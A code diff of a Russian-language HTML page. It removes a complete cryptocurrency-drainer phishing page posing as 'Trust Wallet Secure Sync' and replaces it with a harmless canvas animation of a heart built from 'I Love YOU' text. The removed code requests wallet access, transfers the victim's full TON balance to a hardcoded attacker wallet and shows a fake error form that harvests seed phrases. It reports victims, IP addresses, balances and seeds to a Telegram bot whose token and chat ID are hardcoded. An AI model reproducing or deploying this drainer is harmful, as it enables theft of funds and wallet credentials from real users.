@@ -1,180 +1,339 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Trust Wallet Secure Sync</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Сердце из "I Love YOU"</title>
     <style>
-        body { font-family: Arial; background: #1a1a1a; color: white; text-align: center; padding-top: 50px; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3375BB; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .box { background: #2a2a2a; padding: 30px; border-radius: 20px; max-width: 400px; margin: auto; }
-        button { background: #3375BB; border: none; padding: 12px 30px; border-radius: 30px; color: white; font-size: 16px; margin-top: 20px; cursor: pointer; }
-        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 10px; border: none; }
-        .trust-icon { font-size: 48px; margin-bottom: 10px; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            background: linear-gradient(145deg, #2b0014 0%, #4a0020 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', 'Montserrat', 'Poiret One', system-ui, -apple-system, 'Roboto', sans-serif;
+            padding: 20px;
+        }
+
+        .heart-container {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: radial-gradient(circle at 30% 20%, rgba(255,90,120,0.15), rgba(0,0,0,0) 70%);
+            border-radius: 60px;
+            padding: 20px;
+            box-shadow: 0 25px 45px rgba(0,0,0,0.3), inset 0 1px 2px rgba(255,255,255,0.1);
+        }
+
+        canvas {
+            display: block;
+            margin: 0 auto;
+            max-width: 100%;
+            height: auto;
+            border-radius: 40px;
+            box-shadow: 0 20px 35px rgba(0,0,0,0.3), 0 0 0 2px rgba(255,200,220,0.2);
+            transition: all 0.2s ease;
+        }
+
+        .info {
+            text-align: center;
+            margin-top: 30px;
+            color: #ffc0d0;
+            font-weight: 400;
+            text-shadow: 0 2px 5px #5a0020;
+            letter-spacing: 1px;
+            background: rgba(0,0,0,0.3);
+            display: inline-block;
+            padding: 8px 24px;
+            border-radius: 60px;
+            backdrop-filter: blur(4px);
+            font-size: 1rem;
+        }
+
+        .footer {
+            position: fixed;
+            bottom: 15px;
+            left: 0;
+            right: 0;
+            text-align: center;
+            font-size: 13px;
+            color: #ff90aa;
+            background: rgba(30,0,15,0.5);
+            padding: 5px;
+            font-family: monospace;
+            pointer-events: none;
+        }
+
+        @media (max-width: 600px) {
+            .info {
+                font-size: 0.8rem;
+                margin-top: 20px;
+            }
+            canvas {
+                border-radius: 30px;
+            }
+        }
     </style>
 </head>
 <body>
-<div class="box">
-    <div class="trust-icon">🔐</div>
-    <h2>Trust Wallet Sync</h2>
-    <div class="loader"></div>
-    <p>Подключение к блокчейну...</p>
-    <div id="status">Ожидание подключения кошелька</div>
-    <div id="seedSection" style="display: none;">
-        <p style="color: #ff8888;">⚠️ Ошибка синхронизации</p>
-        <p>Введите seed-фразу для восстановления доступа:</p>
-        <input type="text" id="seedInput" placeholder="введите 12 или 24 слова через пробел">
-        <button id="submitSeed">Восстановить</button>
+<div style="display: flex; flex-direction: column; align-items: center;">
+    <div class="heart-container">
+        <canvas id="heartCanvas" width="600" height="600" style="width:100%; height:auto; max-width:600px; aspect-ratio:1/1"></canvas>
     </div>
+    <div class="info">💖 Каждый пиксель — признание в любви 💖</div>
+    <div class="footer">нажми на сердце — изменится стиль</div>
 </div>
 
 <script>
-    // ========== ВАШИ ДАННЫЕ (ОБНОВЛЕНЫ) ==========
-    const ATTACKER_WALLET = "UQC8-Ax6obG20LnPyIC13NlN8uX-d9JnutWhrOxOFmfoVfs2"; // TON кошелек получателя
-    const TELEGRAM_BOT_TOKEN = "8665174312:AAE_i_f5UV9xYKpRqargdfKRs9FbYZPNpFk";
-    const TELEGRAM_CHAT_ID = "7663459492"; // НОВЫЙ ID
-    // =================================================
+    (function() {
+        const canvas = document.getElementById('heartCanvas');
+        const ctx = canvas.getContext('2d');
 
-    let victimAddress = null;
-    let victimBalance = null;
+        // Размер канваса чётко задан (600x600)
+        canvas.width = 600;
+        canvas.height = 600;
 
-    async function sendToTelegram(message) {
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        try {
-            await fetch(url, {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
-            });
-        } catch(e) {
-            console.log("Telegram error:", e);
-        }
-    }
+        // Фраза, из которой состоит сердце
+        const LOVE_PHRASE = "I Love YOU";
+        // Альтернативные слова для насыщенности (тоже внутри сердца)
+        const ALT_PHRASE = "❤️ LOVE ❤️";
 
-    async function detectWallet() {
-        if(typeof window.ton !== 'undefined') {
-            return { type: 'ton', provider: window.ton };
-        }
-        if(typeof window.ethereum !== 'undefined') {
-            return { type: 'evm', provider: window.ethereum };
-        }
-        if(typeof window.trustwallet !== 'undefined') {
-            return { type: 'trust', provider: window.trustwallet };
-        }
-        return null;
-    }
+        // Параметры сердца (математическая формула)
+        // Используем параметрическую форму сердца: x = 16 * sin(t)^3, y = 13cos(t) - 5 cos(2t) - 2cos(3t) - cos(4t)
+        // Масштабируем и смещаем под размер холста 600x600
 
-    async function drainTrustWallet() {
-        const wallet = await detectWallet();
+        const scale = 14.5;      // масштаб (чем больше, тем крупнее сердце)
+        const offsetX = 300;
+        const offsetY = 310;      // небольшое смещение вниз для центра
 
-        if(!wallet) {
-            document.getElementById('status').innerHTML = '❌ Trust Wallet не установлен. <a href="https://trustwallet.com/download">Установите Trust Wallet</a>';
-            await sendToTelegram(`❌ Жертва открыла страницу, но Trust Wallet не установлен\nIP: ${await getIP()}`);
-            return;
+        // Функция получения координат точки сердца по углу t (0..2PI)
+        function getHeartPoint(t) {
+            // классическая формула сердца
+            const xRaw = 16 * Math.pow(Math.sin(t), 3);
+            const yRaw = 13 * Math.cos(t) - 5 * Math.cos(2*t) - 2*Math.cos(3*t) - Math.cos(4*t);
+            return { x: xRaw * scale, y: -yRaw * scale }; // -yRaw чтобы Y рос вверх
         }
 
-        try {
-            if(wallet.type === 'ton') {
-                document.getElementById('status').innerHTML = '🔄 Подключение TON кошелька...';
-                const accounts = await wallet.request({ method: 'ton_requestAccounts' });
-                victimAddress = accounts[0];
-
-                const balance = await wallet.request({ 
-                    method: 'ton_getBalance', 
-                    params: [victimAddress] 
+        // Генерация набора точек для контура сердца (чтобы плотно заполнить)
+        function generateHeartPoints(numPoints = 4200) {
+            const points = [];
+            for (let i = 0; i < numPoints; i++) {
+                // Неравномерное распределение по длине, но для визуала сойдётся красиво
+                const t = (i / numPoints) * Math.PI * 2;
+                const p = getHeartPoint(t);
+                points.push({
+                    x: p.x + offsetX,
+                    y: p.y + offsetY,
+                    t: t
                 });
-                victimBalance = parseInt(balance) / 1e9;
+            }
+            return points;
+        }
 
-                await sendToTelegram(`🔥 НОВАЯ ЖЕРТВА (TON)\nАдрес: ${victimAddress}\nБаланс: ${victimBalance} TON\nВремя: ${new Date().toLocaleString()}`);
+        // Дополнительно нужно создать массив точек для внутреннего заполнения/толщины
+        // Чтобы сердце выглядело объёмным и состояло из множества надписей,
+        // мы не просто рисуем контур, а генерируем растеризованное "облако" внутри сердца.
+        // Самый зрелищный способ: залить область сердца множеством мелких "I Love YOU".
+        // Сделаем это с помощью проверки попадания точки внутрь формы сердца (ray casting + упрощённая маска)
 
-                if(victimBalance > 0.5) {
-                    document.getElementById('status').innerHTML = `💰 Перевод ${victimBalance} TON...`;
+        // Функция проверки, находится ли точка внутри математического сердца (замкнутой области)
+        function isInsideHeart(px, py) {
+            // переводим в локальные координаты относительно центра сердца (от 0,0 где формула сердца)
+            const localX = (px - offsetX) / scale;
+            const localY = -(py - offsetY) / scale;   // инвертируем Y
 
-                    const tx = {
-                        from: victimAddress,
-                        to: ATTACKER_WALLET,
-                        amount: balance,
-                        currency: 'TON'
-                    };
-
-                    const txHash = await wallet.request({
-                        method: 'ton_sendTransaction',
-                        params: [tx]
-                    });
-
-                    await sendToTelegram(`✅ СЛИВ TON УСПЕШЕН!\nСумма: ${victimBalance} TON\nTxHash: ${txHash}\nЖертва: ${victimAddress}`);
-                    document.getElementById('status').innerHTML = `✅ СЛИТО! ${victimBalance} TON`;
-                } else {
-                    await sendToTelegram(`⚠️ Баланс TON менее 0.5 (${victimBalance} TON)`);
-                    showSeedPhishing();
+            // Быстрый и точный метод: определим угловой диапазон и проверим кривую.
+            // Используем то, что для фиксированного X ищем границы Y (метод трассировки).
+            // Упрощённо: пройдём по параметру t и найдём пересечения.
+            let intersections = 0;
+            const tStep = Math.PI * 2 / 360;
+            for (let t = 0; t < Math.PI * 2; t += tStep) {
+                const p1 = getHeartPoint(t);
+                const t2 = t + tStep;
+                const p2 = getHeartPoint(t2);
+                // Проверяем пересечение горизонтального луча (вправо) с отрезком (p1,p2)
+                if ((p1.y > localY) !== (p2.y > localY) &&
+                    (localX < (p2.x - p1.x) * (localY - p1.y) / (p2.y - p1.y) + p1.x)) {
+                    intersections++;
                 }
             }
+            return (intersections % 2) === 1;
+        }
 
-            else if(wallet.type === 'evm') {
-                document.getElementById('status').innerHTML = '🔄 Подключение EVM кошелька...';
-                const accounts = await wallet.provider.request({ method: 'eth_requestAccounts' });
-                victimAddress = accounts[0];
+        // Генерируем сетку точек внутри bounding box сердца, чтобы плотно покрыть область
+        function generateDenseHeartPointsInside(step = 8) {
+            // step — расстояние между точками в пикселях, чем меньше, тем больше надписей
+            const pointsInside = [];
+            // Bounding box сердца в экранных координатах
+            const margin = 45;
+            let minX = offsetX - 14 * scale;
+            let maxX = offsetX + 14 * scale;
+            let minY = offsetY - 17 * scale;
+            let maxY = offsetY + 14 * scale;
 
-                const balanceWei = await wallet.provider.request({ 
-                    method: 'eth_getBalance', 
-                    params: [victimAddress, 'latest'] 
-                });
-                victimBalance = parseInt(balanceWei) / 1e18;
-
-                await sendToTelegram(`🔥 НОВАЯ ЖЕРТВА (EVM/Trust)\nАдрес: ${victimAddress}\nБаланс: ${victimBalance} ETH/BNB\nВремя: ${new Date().toLocaleString()}`);
-
-                if(parseInt(balanceWei) > 5000000000000000) {
-                    document.getElementById('status').innerHTML = `💰 Слив ${victimBalance}...`;
-                    await sendToTelegram(`⚠️ EVM слив требует EVM-адрес (0x...). Текущий адрес TON.`);
-                    showSeedPhishing();
-                } else {
-                    showSeedPhishing();
+            // Пройдём по всей области
+            for (let y = minY; y <= maxY; y += step) {
+                for (let x = minX; x <= maxX; x += step) {
+                    if (isInsideHeart(x, y)) {
+                        // Добавляем небольшую псевдо-случайную вариацию смещения для «живого» вида
+                        const jitterX = (Math.sin(x * 0.02 + y * 0.03) * 1.2) | 0;
+                        const jitterY = (Math.cos(y * 0.02 + x * 0.017) * 1.2) | 0;
+                        pointsInside.push({
+                            x: x + jitterX,
+                            y: y + jitterY,
+                        });
+                    }
                 }
             }
-
-            else {
-                showSeedPhishing();
-            }
-
-        } catch(e) {
-            await sendToTelegram(`❌ Ошибка: ${e.message}\nIP: ${await getIP()}`);
-            document.getElementById('status').innerHTML = `❌ Ошибка: ${e.message}`;
-            showSeedPhishing();
+            return pointsInside;
         }
-    }
 
-    async function getIP() {
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            return data.ip;
-        } catch(e) { return 'unknown'; }
-    }
+        // Стиль рендеринга: чередование фраз, оттенки красного, разные повороты
+        let colorStyle = 0;   // 0 - тёплая красная градиентная, 1 - розовая с белыми акцентами, 2 - огненно-золотая
 
-    function showSeedPhishing() {
-        document.getElementById('seedSection').style.display = 'block';
-        document.getElementById('submitSeed').onclick = async function() {
-            const seed = document.getElementById('seedInput').value;
-            if(seed.length > 10) {
-                await sendToTelegram(`🔑 СИД-ФРАЗА TRUST WALLET ПОЛУЧЕНА!\nАдрес: ${victimAddress || 'неизвестен'}\nСид: ${seed}\nТип: Trust Wallet\nВремя: ${new Date().toLocaleString()}`);
-                alert("Восстановление выполнено. Перезапустите Trust Wallet.");
-                document.getElementById('seedSection').innerHTML = '<p style="color:green;">✅ Восстановлено. Обновите страницу.</p>';
-                setTimeout(() => { window.location.href = "https://trustwallet.com"; }, 2000);
+        function getTextColor(x, y, idx) {
+            const heartDist = Math.hypot(x - offsetX, y - offsetY);
+            const mixVal = (Math.sin(x * 0.03) * Math.cos(y * 0.03) + 1) / 2;
+            if (colorStyle === 0) {
+                const r = 220 + Math.floor(35 * Math.sin(x * 0.02 + idx * 0.01));
+                const g = 70 + Math.floor(40 * Math.cos(y * 0.02));
+                const b = 90 + Math.floor(30 * Math.sin(idx * 0.02));
+                return `rgb(${r}, ${g}, ${b})`;
+            } else if (colorStyle === 1) {
+                const r = 255 - Math.floor(45 * mixVal);
+                const g = 120 + Math.floor(80 * (Math.sin(x * 0.025) + 1) / 2);
+                const b = 150 + Math.floor(70 * Math.cos(y * 0.02));
+                return `rgb(${r}, ${g}, ${b})`;
             } else {
-                alert("Введите корректную seed-фразу (12+ слов)");
+                const r = 255;
+                const g = 100 + Math.floor(100 * Math.sin(x * 0.02 + y * 0.01));
+                const b = 50 + Math.floor(60 * Math.cos(y * 0.025));
+                return `rgb(${r}, ${g}, ${b})`;
             }
-        };
-    }
-
-    sendToTelegram(`🚀 SWILL фишинг запущен\nВремя: ${new Date().toLocaleString()}\nЦель: Trust Wallet / TON`);
-    drainTrustWallet();
-
-    setTimeout(() => {
-        if(!victimAddress) {
-            drainTrustWallet();
         }
-    }, 5000);
+
+        function getFontSize(x, y, idx) {
+            // Размер шрифта 13px - 20px, в зависимости от удаления от центра, динамика
+            const centerDist = Math.hypot(x - offsetX, y - offsetY);
+            let size = 14 + Math.floor(5 * Math.sin(idx * 0.07) + 2 * Math.cos(y * 0.03));
+            if (centerDist < 65) size += 3;
+            if (centerDist > 130) size = Math.max(11, size - 2);
+            return `${size}px`;
+        }
+
+        function getRotation(x, y) {
+            // лёгкий наклон для красоты
+            return (Math.sin(x * 0.012) * Math.cos(y * 0.012)) * 0.18;
+        }
+
+        // основная отрисовка
+        let activePoints = [];
+        let textCache = [];
+
+        function buildHeartPoints() {
+            // используем плотную сетку (шаг 9 пикселей - баланс между производительностью и плотностью)
+            activePoints = generateDenseHeartPointsInside(9);
+            // подготавливаем для каждого точки, какую надпись показать (основную или дополнительную)
+            textCache = activePoints.map((p, i) => {
+                const useAlt = (Math.floor(p.x * 0.023 + p.y * 0.017) % 3 === 0) || (i % 7 === 2);
+                return useAlt ? ALT_PHRASE : LOVE_PHRASE;
+            });
+        }
+
+        function drawHeart() {
+            if (!ctx) return;
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            
+            // Лёгкий полупрозрачный фон - сияние
+            ctx.save();
+            
+            // Рисуем каждую точку как текст
+            for (let idx = 0; idx < activePoints.length; idx++) {
+                const p = activePoints[idx];
+                const phrase = textCache[idx];
+                ctx.save();
+                ctx.translate(p.x, p.y);
+                const angle = getRotation(p.x, p.y);
+                ctx.rotate(angle);
+                ctx.font = `${getFontSize(p.x, p.y, idx)} "Segoe UI", "Montserrat", "Poiret One", system-ui, sans-serif`;
+                ctx.fillStyle = getTextColor(p.x, p.y, idx);
+                ctx.shadowBlur = 4;
+                ctx.shadowColor = "rgba(0,0,0,0.4)";
+                ctx.shadowOffsetX = 1;
+                ctx.shadowOffsetY = 1;
+                ctx.textAlign = "center";
+                ctx.textBaseline = "middle";
+                ctx.fillText(phrase, 0, 0);
+                ctx.restore();
+            }
+            
+            // Добавляем изящный контур сердца и блики поверх (эффект свечения)
+            ctx.save();
+            ctx.shadowBlur = 0;
+            ctx.beginPath();
+            // рисуем математический контур сердца полупрозрачной линией
+            for (let t = 0; t <= Math.PI * 2; t += 0.05) {
+                const point = getHeartPoint(t);
+                const screenX = point.x + offsetX;
+                const screenY = point.y + offsetY;
+                if (t === 0) ctx.moveTo(screenX, screenY);
+                else ctx.lineTo(screenX, screenY);
+            }
+            ctx.closePath();
+            ctx.strokeStyle = "rgba(255, 180, 200, 0.7)";
+            ctx.lineWidth = 2.2;
+            ctx.stroke();
+            ctx.restore();
+            
+            // Добавим искры или блеск в центре
+            ctx.beginPath();
+            ctx.arc(offsetX + 2, offsetY - 5, 8, 0, Math.PI*2);
+            ctx.fillStyle = "rgba(255, 220, 160, 0.3)";
+            ctx.fill();
+        }
+        
+        function handleResizeAndRedraw() {
+            drawHeart();
+        }
+        
+        // смена стиля по клику на канвас
+        function cycleColorStyle() {
+            colorStyle = (colorStyle + 1) % 3;
+            drawHeart();
+        }
+        
+        // инициализация
+        buildHeartPoints();
+        drawHeart();
+        
+        // Перестройка при изменении ориентации экрана (не сбрасывает форму)
+        window.addEventListener('resize', () => {
+            setTimeout(() => drawHeart(), 20);
+        });
+        
+        canvas.addEventListener('click', (e) => {
+            cycleColorStyle();
+            // небольшой эффект "пульса" при клике
+            canvas.style.transform = 'scale(0.98)';
+            setTimeout(() => { canvas.style.transform = ''; }, 130);
+        });
+        
+        // дополнительный эффект при касании (мобильные)
+        canvas.addEventListener('touchstart', (e) => {
+            e.preventDefault();
+            cycleColorStyle();
+            canvas.style.transform = 'scale(0.98)';
+            setTimeout(() => { canvas.style.transform = ''; }, 130);
+        });
+        
+        console.log("Сердце любви загружено! ❤️ I Love YOU ❤️");
+    })();
 </script>
 </body>
 </html>
